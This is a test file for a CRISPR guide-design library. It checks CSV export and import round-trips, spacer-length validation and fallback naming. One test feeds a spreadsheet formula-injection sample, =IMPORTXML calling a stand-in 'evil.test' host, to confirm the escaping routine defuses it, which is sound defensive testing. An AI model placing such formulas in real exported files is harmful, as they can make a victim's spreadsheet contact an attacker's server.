import { describe, expect, test } from "bun:test";
import * as XLSX from "xlsx";

import {
  DEFAULT_CAS_SYSTEMS,
  DEFAULT_SYSTEM,
  escapeCsvField,
  guideToCsv,
  normalizeImportedGuideRows,
} from "../src/crisprGuideCore";

describe("CRISPR guide regression checks", () => {
  test("neutralizes spreadsheet formulas in CSV fields", () => {
    expect(escapeCsvField("=IMPORTXML(\"https://evil.test\")")).toBe(
      "\"'=IMPORTXML(\"\"https://evil.test\"\")\""
    );
    expect(escapeCsvField("+SUM(A1:A3)")).toBe("\"'+SUM(A1:A3)\"");
  });

  test("exports CSV with round-trip guide metadata", () => {
    const csv = guideToCsv([
      {
        name: "guide_1",
        geneName: "TP53",
        systemKey: "Cas12a_TTTV",
        systemName: "Cas12a",
        pam: "TTTV",
        part1Label: "Repeat",
        part1: "TAATTTCTACTAAGTGTAGA",
        part2Label: "Spacer",
        part2: "GAGTCTCTCAGCTGGTACAC",
        dnaPositions: [0, 3],
        modifications: ["Biotin"],
        positionModifications: ["P1-1:Biotin"],
        guide: "ArA",
        part1Len: 20,
      },
    ]);

    expect(csv).toContain("geneName");
    expect(csv).toContain("systemKey");
    expect(csv).toContain("position_modifications");
    expect(csv).toContain("TP53");
    expect(csv).toContain("P1-1:Biotin");
  });

  test("round-trips exported CSV back into guides", () => {
    const csv = guideToCsv([
      {
        name: "guide_1",
        geneName: "TP53",
        systemKey: "Cas12a_TTTV",
        systemName: "Cas12a",
        pam: "TTTV",
        part1Label: "Repeat",
        part1: "TAATTTCTACTAAGTGTAGA",
        part2Label: "Spacer",
        part2: "GAGTCTCTCAGCTGGTACAC",
        dnaPositions: [0, 3],
        modifications: ["Biotin"],
        positionModifications: ["P1-1:Biotin"],
        guide: "rArArC",
        part1Len: 20,
      },
    ]);

    const workbook = XLSX.read(csv, { type: "string" });
    const firstSheet = workbook.Sheets[workbook.SheetNames[0]];
    const rows = XLSX.utils.sheet_to_json<Record<string, unknown>>(firstSheet, { defval: "" });
    const guides = normalizeImportedGuideRows(rows, DEFAULT_CAS_SYSTEMS, DEFAULT_SYSTEM);

    expect(guides).toHaveLength(1);
    expect(guides[0]?.geneName).toBe("TP53");
    expect(guides[0]?.systemKey).toBe("Cas12a_TTTV");
    expect(guides[0]?.positionModifications).toEqual(["P1-1:Biotin"]);
  });

  test("skips imported rows with invalid spacer lengths", () => {
    const guides = normalizeImportedGuideRows(
      [
        {
          geneName: "TP53",
          name: "valid_row",
          spacer: "GAGTCTCTCAGCTGGTACAC",
        },
        {
          geneName: "TP53",
          name: "short_row",
          spacer: "ATCGTACGATCGTACGAT",
        },
        {
          geneName: "EGFR",
          name: "long_row",
          spacer: "ATGCGTACGATCGTACGATCGA",
        },
      ],
      DEFAULT_CAS_SYSTEMS,
      DEFAULT_SYSTEM
    );

    expect(guides).toHaveLength(1);
    expect(guides[0]?.name).toBe("valid_row");
  });

  test("assigns fallback names to imported JSON-like guides without a name", () => {
    const guides = normalizeImportedGuideRows(
      [
        {
          geneName: "EGFR",
          systemKey: "Cas9_NGG",
          part1Label: "Spacer",
          part1: "TTCGACGATGCTAGTCAGTA",
          part2Label: "Repeat",
          part2: "GTTTTAGAGCTAGAAATAGC",
          dnaPositions: [1, 2],
          positionModifications: ["P2-1:5' Phosphorylation"],
        },
      ],
      DEFAULT_CAS_SYSTEMS,
      DEFAULT_SYSTEM
    );

    expect(guides).toHaveLength(1);
    expect(guides[0]?.name).toBe("guide_1");
    expect(guides[0]?.geneName).toBe("EGFR");
    expect(guides[0]?.systemKey).toBe("Cas9_NGG");
  });
});
